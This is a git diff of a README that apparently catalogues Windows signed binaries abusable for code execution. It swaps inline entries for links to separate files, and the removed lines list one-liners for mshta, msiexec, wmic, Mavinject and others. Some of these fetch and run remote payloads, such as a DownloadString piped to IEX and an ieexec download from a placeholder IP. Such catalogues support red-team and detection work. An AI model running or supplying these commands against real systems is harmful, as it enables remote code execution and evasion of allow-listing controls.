@@ -5,287 +5,31 @@ If you are missing from the acknowledgement, please let me know (I did not forge
    
 # OS BINARIES
    
-[Rundll32.exe](OSBinaries/Rundll32.md)
+[Rundll32.exe](OSBinaries/Rundll32.md) 
 [Regsvr32.exe](OSBinaries/Regsvr32.md)   
+[Msbuild.exe](OSBinaries/Msbuild.md) 
+[Regsvcs.exe](OSBinaries/Regsvcs.md) 
+[Regasm.exe](OSBinaries/Regasm.md) 
+[Installutil.exe](OSBinaries/Installutil.md)    
+[Mshta.exe](OSBinaries/Mshta.md)    
+[Ieexec.exe](OSBinaries/Ieexec.md)    
+[Presentationhost.exe](OSBinaries/Presentationhost.md)    
+[Msiexec.exe](OSBinaries/Msiexec.md)  
+[Cmstp.exe](OSBinaries/Cmstp.md)  
+[Xwizard.exe](OSBinaries/Xwizard.md)   
+[Odbcconf.exe](OSBinaries/Odbcconf.md)   
+[Forfiles.exe](OSBinaries/Forfiles.md)   
+[Syncappvpublishingserver.exe](OSBinaries/Syncappvpublishingserver.md)   
+[Infdefaultinstall.exe](OSBinaries/Infdefaultinstall.md)   
+[Atbroker.exe](OSBinaries/Atbroker.md)   
+[Wmic.exe](OSBinaries/Wmic.md)   
+[Mavinject32.exe](OSBinaries/Mavinject32.md)      
+[Runscripthelper.exe](OSBinaries/Runscripthelper.md)   
+[Control.exe](OSBinaries/Control.md)   
+[ie4unit.exe](OSBinaries/ie4unit.md)   
+
    
-   
-## Msbuild.exe
-  
-* Functions: Execute
 
-```
-msbuild.exe pshell.xml
-```
-  
-Acknowledgements:
-* Casey Smith - @subtee
-  
-  
-  
-## Regsvcs.exe
-
-* Functions: Execute
-
-```
-regsvcs.exe /U regsvcs.dll
-
-regsvcs.exe regsvcs.dll
-```
-
-Acknowledgements:
-* Casey Smith - @subtee
-  
-  
-  
-## Regasm.exe
-
-* Functions: Execute
-
-```
-regasm.exe /U regsvcs.dll
-
-regasm.exe regsvcs.dll
-```
-
-Acknowledgements:
-* Casey Smith - @subtee
-  
-  
-   
-## InstallUtil.exe
-
-* Functions: Execute
-
-```
-InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
-```
-
-Acknowledgements:
-* Casey Smith - @subtee
-   
-   
-   
-## mshta.exe
-
-* Functions: Execute
-
-```
-mshta.exe evilfile.hta
-```
-
-Acknowledgements:
-* ?   
-   
-   
-   
-## IEExec.exe
-
-* Functions: Execute
-
-```
-ieexec.exe http://x.x.x.x:8080/bypass.exe
-```
-
-Acknowledgements:
-* ?
-  
-  
-  
-## PresentationHost.exe
-
-* Functions: Execute
-
-```
-Presentationhost.exe C:\temp\Evil.xbap
-```
-
-Acknowledgements:
-* Casey Smith - @subtee
-  
-   
-   
-## Msiexec.exe
-
-* Functions: Execute
-
-```
-msiexec /quiet /i cmd.msi
-msiexec /q /i http://192.168.100.3/tmp/cmd.png
-```
-
-Acknowledgements:
-* Casey Smith - @subtee
-  
-  
-  
-## CMSTP.exe
-
-* Functions: Execute
-
-```
-cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
-```
-
-Acknowledgements:
-* Oddvar Moe - @oddvarmoe
-* Nick Tyrer - @NickTyrer
-  
-   
-    
-## Xwizard.exe
-
-* Functions: DLL hijack
-
-```
-xwizard.exe  (xwizard.dll in same folder)
-```
-
-Acknowledgements:
-* Adam - @Hexacorn
-  
-  
-  
-## odbcconf.exe
-
-* Functions: Execute
-
-```
-odbcconf -f file.rsp
-```
-
-Acknowledgements:
-* @subtee
-   
-   
-   
-## Forfiles.exe
-
-* Functions: Execute
-
-```
-forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
-```
-
-Acknowledgements:
-* Eric - @vector_sec
-   
-   
-   
-## SyncAppvPublishingServer.exe
-
-* Functions: Execute
-
-```
-SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX
-```
-
-Acknowledgements:
-* Nick Landers - @monoxgas
-   
-   
-   
-## InfDefaultInstall.exe
-
-* Functions: Execute
-
-```
-InfDefaultInstall.exe shady.inf
-```
-
-Acknowledgements:
-* Kyle Hanslovan - @kylehanslovan
-   
-   
-   
-## Atbroker.exe
-
-* Functions: Execute
-
-```
-ATBroker.exe /start malware
-```
-
-Acknowledgements:
-* Adam - @hexacorn
-   
-   
-   
-## WMIC.exe
-
-* Functions: Execute
-
-```
-wmic process call create calc
-
-wmic process get brief /format:"https://www.example.com/file.xsl
-
-wmic os get /format:"MYXSLFILE.xsl"
-
-wmic process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
-```
-
-Acknowledgements:
-* Casey Smith - @subtee
-   
-   
-   
-## Mavinject32.exe
-
-* Functions: Execute
-
-```
-MavInject32.exe <PID> /INJECTRUNNING <PATH DLL>
-
-MavInject32.exe 3110 /INJECTRUNNING c:\folder\evil.dll>
-```
-
-Acknowledgements:
-* Giuseppe N3mes1s - @gN3mes1s
-* Adam - @hexacorn
-   
-   
-   
-## Runscripthelper.exe
-
-* Functions: Execute
-
-```
-runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test
-```
-
-Acknowledgements:
-* Matt Graeber - @mattifestation
-   
-   
-   
-## Control.exe
-
-* Functions: Execute
-
-```
-control.exe c:\windows\tasks\file.txt:evil.dll
-
-control.exe 
-(Add registry in HKCU\Software\Microsoft\Windows\currentversion\controlpanel\CPLS to manipulate)
-```
-
-Acknowledgements:
-* Jimmy - @bohops
-   
-   
-   
-## ie4unit.exe
-
-* Functions: Execute
-
-```
-ie4unit.exe -BaseSettings
-(copy out ie4unit.exe and ieuinit.inf - add SCT in the MSIE4RegisterOCX.Windows7 section)
-```
-
-Acknowledgements:
-* Jimmy - @bohops
-   
    
    
 # OTHER MICROSOFT SIGNED BINARIES
